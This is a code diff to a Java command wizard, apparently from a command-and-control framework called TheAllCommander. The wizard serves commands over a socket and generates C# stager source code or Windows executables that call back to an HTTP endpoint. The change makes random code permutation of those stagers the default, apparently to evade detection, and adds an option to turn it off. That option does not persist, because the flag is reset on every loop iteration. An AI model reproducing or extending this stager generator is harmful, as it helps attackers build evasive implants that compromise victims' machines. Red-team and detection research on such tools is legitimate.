@@ -15,6 +15,9 @@ public class CommandWizard implements Runnable {
 
 	public static String CMD_QUIT = "quit";
 	public static String CMD_GENERATE_CSHARP = "generate_csharp";
+	public static String CMD_GENERATE_CSHARP_OPTION_DISABLE_RANDOM ="disable_random";
+	public static String CMD_GENERATE_CSHARP_OPTION_EXE ="exe";
+	public static String CMD_GENERATE_CSHARP_OPTION_TEXT ="text";
 
 	private Socket socket;
 	private Path csharpConfigDir;
@@ -35,6 +38,7 @@ public class CommandWizard implements Runnable {
 			boolean stayRunning = true;
 			while (stayRunning) {
 				String nextCommand = br.readLine();
+				boolean enableRandomCode = true;
 				if (nextCommand.equalsIgnoreCase(CMD_QUIT)) {
 					stayRunning = false;
 					bw.write("Goodbye!" + System.lineSeparator());
@@ -48,20 +52,32 @@ public class CommandWizard implements Runnable {
 							connectionArgs.add(args[idx]);
 						}
 
-						if (args[1].equalsIgnoreCase("text")) {
+						if (args[1].equalsIgnoreCase(CMD_GENERATE_CSHARP_OPTION_TEXT)) {
 							try {
-								bw.write(StagerGenerator.generateStagedSourceFile(csharpConfigDir, args[2],
+								if(enableRandomCode) {
+								bw.write(StagerGenerator.generateStagedSourceFileWithRandomCode(csharpConfigDir, args[2],
 										connectionArgs) + System.lineSeparator());
+								}else {
+									bw.write(StagerGenerator.generateStagedSourceFile(csharpConfigDir, args[2],
+											connectionArgs) + System.lineSeparator());
+								}
 							} catch (IOException ex) {
 								bw.write("Unable to generate source file " + ex.getMessage() + System.lineSeparator());
 							}
-						} else if (args[1].equalsIgnoreCase("exe")) {
+						} else if (args[1].equalsIgnoreCase(CMD_GENERATE_CSHARP_OPTION_EXE)) {
 							try {
-								bw.write("<control> " + CommandWizard.CMD_GENERATE_CSHARP + " " + StagerGenerator.generateStagerExe(csharpConfigDir, args[2], connectionArgs) + System.lineSeparator());
+								if(enableRandomCode) {
+									bw.write("<control> " + CommandWizard.CMD_GENERATE_CSHARP + " " + StagerGenerator.generateStagerExe(csharpConfigDir, args[2], connectionArgs, true) + System.lineSeparator());
+								}else {
+									bw.write("<control> " + CommandWizard.CMD_GENERATE_CSHARP + " " + StagerGenerator.generateStagerExe(csharpConfigDir, args[2], connectionArgs, false) + System.lineSeparator());
+								}
 							} catch (IOException ex) {
 								bw.write("Unable to generate exe file " + ex.getMessage() + System.lineSeparator());
 							}
-						} else {
+						} else if(args[1].equalsIgnoreCase(CMD_GENERATE_CSHARP_OPTION_DISABLE_RANDOM)) {
+							bw.write("Disabling random C# code permutation for this session" + System.lineSeparator());
+							enableRandomCode = false;
+						}else {
 							bw.write("Unknown format option for " + CMD_GENERATE_CSHARP + System.lineSeparator());
 						}
 					}
@@ -80,11 +96,12 @@ public class CommandWizard implements Runnable {
 
 	private void printAvailableCommands(OutputStreamWriter bw) throws IOException {
 		bw.write("Available commands: " + System.lineSeparator());
-		bw.write(CMD_GENERATE_CSHARP + " text <format - http> <argments>" + System.lineSeparator());
-		bw.write("Example: " + CMD_GENERATE_CSHARP + " text http https://127.0.0.1:8000/csharpboot"
+		bw.write(CMD_GENERATE_CSHARP + " " + CMD_GENERATE_CSHARP_OPTION_DISABLE_RANDOM + " : Disable random C# code generation" + System.lineSeparator());
+		bw.write(CMD_GENERATE_CSHARP + " " + CMD_GENERATE_CSHARP_OPTION_TEXT + " <format - http> <argments>" + System.lineSeparator());
+		bw.write("Example: " + CMD_GENERATE_CSHARP + " " + CMD_GENERATE_CSHARP_OPTION_TEXT + " http https://127.0.0.1:8000/csharpboot"
 				+ System.lineSeparator());
-		bw.write(CMD_GENERATE_CSHARP + " exe <format - http> <argments>" + System.lineSeparator());
-		bw.write("Example: " + CMD_GENERATE_CSHARP + " exe http https://127.0.0.1:8000/csharpboot"
+		bw.write(CMD_GENERATE_CSHARP + " " + CMD_GENERATE_CSHARP_OPTION_EXE + " <format - http> <argments>" + System.lineSeparator());
+		bw.write("Example: " + CMD_GENERATE_CSHARP + " " + CMD_GENERATE_CSHARP_OPTION_EXE + " http https://127.0.0.1:8000/csharpboot"
 				+ System.lineSeparator());
 		bw.write("Note: Only available with TheAllCommander on Windows" + System.lineSeparator());
 		bw.write(CMD_QUIT + System.lineSeparator());
